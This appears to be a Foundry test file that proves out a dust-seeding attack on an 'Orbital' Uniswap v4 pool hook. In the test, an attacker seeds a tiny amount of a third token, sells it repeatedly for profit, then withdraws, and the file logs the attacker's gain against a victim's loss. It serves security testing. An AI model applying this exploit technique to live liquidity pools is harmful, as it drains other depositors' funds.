// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {TestBase_UniswapV4OrbitalSwapHook} from "contracts/hooks/uniswap/v4/orbital/TestBase_UniswapV4OrbitalSwapHook.sol";

/// Orbital (sphere, pegged-stable) sibling: honest partial first mint (A,B), attacker dust-seeds C, sells C.
contract OrbitalPartialDustSeed_Test is TestBase_UniswapV4OrbitalSwapHook {
    address internal attacker = address(0xA77AC);

    function _bal(address w) internal view returns (uint256) {
        return token0.balanceOf(w) + token1.balanceOf(w) + token2.balanceOf(w);
    }

    function _swapAs(address w, address tin, address tout, uint256 amt) internal {
        PoolKey memory key = _poolKeyFor(tin, tout);
        bool z = tin == Currency.unwrap(key.currency0);
        vm.prank(w);
        swapRouter.swapExactIn(key, SwapParams({zeroForOne: z, amountSpecified: -int256(amt), sqrtPriceLimitX96: _sqrtLimit(z)}), "");
    }

    function _approve(address w) internal {
        vm.startPrank(w);
        token0.approve(hook, type(uint256).max); token1.approve(hook, type(uint256).max); token2.approve(hook, type(uint256).max);
        token0.approve(address(swapRouter), type(uint256).max); token1.approve(address(swapRouter), type(uint256).max); token2.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
    }

    function _attack(uint256 dust) internal returns (int256 net, uint256 aShares) {
        token2.mint(attacker, 2_000e18);
        _approve(attacker);
        uint256 a0 = _bal(attacker);
        vm.prank(attacker);
        (aShares,,,) = orbital.addLiquidity(0, 0, dust, attacker, 0, block.timestamp + 1, "");
        uint256 step = 5e18;
        for (uint256 k; k < 600; ++k) {
            address tout = k % 2 == 0 ? address(token0) : address(token1);
            uint256 o;
            try orbital.previewSwapExactIn(address(token2), tout, step) returns (uint256 x) { o = x; } catch { break; }
            if (o <= step) break;
            _swapAs(attacker, address(token2), tout, step);
        }
        vm.prank(attacker);
        orbital.removeLiquidity(aShares, attacker, 0, 0, 0, block.timestamp + 1);
        net = int256(_bal(attacker)) - int256(a0);
    }

    function test_orbitalDustSeed() public {
        (uint256 vShares,,,) = _addLiquidity(1000e18, 1000e18, 0);
        console.log("radius", orbital.radius());
        (int256 net,) = _attack(1e9);
        vm.prank(user);
        (uint256 o0, uint256 o1, uint256 o2) = orbital.removeLiquidity(vShares, user, 0, 0, 0, block.timestamp + 1);
        console.log("reserves", orbital.reserveOf(address(token0)), orbital.reserveOf(address(token1)), orbital.reserveOf(address(token2)));
        if (net >= 0) console.log("ATTACKER NET PROFIT", uint256(net)); else console.log("ATTACKER NET LOSS", uint256(-net));
        console.log("victim out (in 2000e18)", o0 + o1 + o2);
    }

    function test_orbital_controlFairSeed() public {
        _addLiquidity(1000e18, 1000e18, 0);
        token2.mint(attacker, 1000e18);
        _approve(attacker);
        vm.prank(attacker);
        orbital.addLiquidity(0, 0, 1000e18, attacker, 0, block.timestamp + 1, "");
        console.log("fair-seed C->A 5e18 out", orbital.previewSwapExactIn(address(token2), address(token0), 5e18));
    }
}
